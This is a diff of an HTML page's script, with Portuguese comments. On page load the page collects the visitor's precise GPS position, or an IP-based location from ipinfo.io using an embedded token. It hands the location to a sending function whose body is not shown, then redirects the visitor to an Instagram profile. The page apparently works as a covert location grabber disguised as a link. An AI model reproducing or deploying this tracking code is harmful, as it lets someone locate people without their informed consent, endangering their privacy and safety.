@@ -15,7 +15,7 @@
         }
 
         function tentarLocalizacaoPorIP() {
-            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua com seu token real
+            fetch('https://ipinfo.io/json?token=848013f8df8279')
                 .then(res => res.json())
                 .then(d => {
                     const [lat, lon] = d.loc.split(',');
@@ -23,27 +23,34 @@
                         parseFloat(lat),
                         parseFloat(lon),
                         false,
-                        d.city,
-                        d.region,
-                        d.country
+                        d.city || '',
+                        d.region || '',
+                        d.country || ''
                     );
                 })
                 .catch(() => {
-                    enviarLocalizacao(0.0, 0.0, false);
+                    // Em caso de erro, ainda redireciona
+                    window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
                 });
         }
 
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const { latitude, longitude } = pos.coords;
-                enviarLocalizacao(latitude, longitude, true);
-            },
-            err => {
-                console.warn("GPS negado ou falhou:", err);
+        window.onload = function () {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const { latitude, longitude } = pos.coords;
+                        enviarLocalizacao(latitude, longitude, true);
+                    },
+                    err => {
+                        console.warn("GPS falhou ou negado:", err);
+                        tentarLocalizacaoPorIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+                );
+            } else {
                 tentarLocalizacaoPorIP();
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+            }
+        };
     </script>
 </head>
 <body>
